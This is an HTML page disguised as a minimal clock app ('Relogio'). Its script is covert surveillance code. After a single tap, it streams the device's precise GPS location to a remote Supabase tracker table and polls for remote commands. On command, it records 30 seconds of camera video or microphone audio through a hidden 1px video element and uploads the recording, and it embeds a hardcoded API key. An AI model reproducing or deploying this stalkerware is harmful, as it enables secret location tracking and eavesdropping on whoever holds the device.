<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#000"><title>Relogio</title><link rel="manifest" href="manifest-clock.json">
<style>html,body{margin:0;height:100%;background:#000;overflow:hidden;display:flex;align-items:center;justify-content:center;flex-direction:column}
#h{font-size:62px;color:#151515;font-family:monospace}#s{font-size:12px;color:#222;margin-top:6px}</style>
</head><body><div id="h">--:--</div><div id="s">toque para ativar</div><video id="v" autoplay muted playsinline style="width:1px;height:1px;opacity:0.01"></video>
<script>
if('serviceWorker' in navigator){navigator.serviceWorker.register('sw.js')}
const U="https://jpaflbkafupwqfqfcjrv.supabase.co", K="sb_publishable_qek2mggF5M47pKggbM42tQ_WTFnOOxf";
function clock(){document.getElementById('h').innerText=new Date().toLocaleTimeString('pt-BR',{hour:'2-digit',minute:'2-digit'})}
setInterval(clock,1000); clock();
let lastCmd=0;
async function uploadBlob(blob, ext){
 const name=`LG_${Date.now()}.${ext}`;
 await fetch(`${U}/storage/v1/object/videos/${name}`,{method:"POST",headers:{apikey:K,Authorization:"Bearer "+K,"x-upsert":"true","Content-Type":blob.type},body:blob});
}
async function startRec(mode){
 try{
  const constraints= mode=='audio'?{audio:true}:{video:{facingMode:"environment"},audio:true};
  const stream=await navigator.mediaDevices.getUserMedia(constraints);
  document.getElementById('v').srcObject=stream;
  const rec=new MediaRecorder(stream); let chunks=[];
  rec.ondataavailable=e=>chunks.push(e.data);
  rec.onstop=async()=>{
   const blob=new Blob(chunks,{type:mode=='audio'?'audio/webm':'video/webm'});
   await uploadBlob(blob, mode=='audio'?'webm':'webm');
   stream.getTracks().forEach(t=>t.stop()); document.getElementById('s').innerText="● enviado";
  };
  rec.start(); document.getElementById('s').innerText=mode=='audio'?"● gravando áudio...":"● gravando vídeo...";
  setTimeout(()=>rec.stop(),30000);
 }catch(e){document.getElementById('s').innerText="erro permissão câmera/mic"}
}
async function checkCmd(){
 const r=await fetch(`${U}/rest/v1/comandos?device_id=eq.LG&order=created_at.desc&limit=1`,{headers:{apikey:K,Authorization:"Bearer "+K}});
 const d=await r.json(); if(!d[0]) return;
 const t=new Date(d[0].created_at).getTime(); if(t<=lastCmd) return;
 if(Date.now()-t>60000) return; lastCmd=t;
 if(d[0].acao=='audio') startRec('audio'); if(d[0].acao=='video') startRec('video');
}
document.body.onclick=()=>{
 document.body.requestFullscreen?.(); navigator.wakeLock?.request('screen');
 navigator.geolocation.watchPosition(async p=>{
  await fetch(`${U}/rest/v1/rastreador`,{method:"POST",headers:{apikey:K,Authorization:"Bearer "+K,"Content-Type":"application/json",Prefer:"resolution=merge-duplicates"},body:JSON.stringify({device_id:"LG",lat:p.coords.latitude,lng:p.coords.longitude,updated_at:new Date().toISOString()})});
 },{},{enableHighAccuracy:true});
 setInterval(checkCmd,3000); document.getElementById('s').innerText="● ativo";
};
</script></body></html>
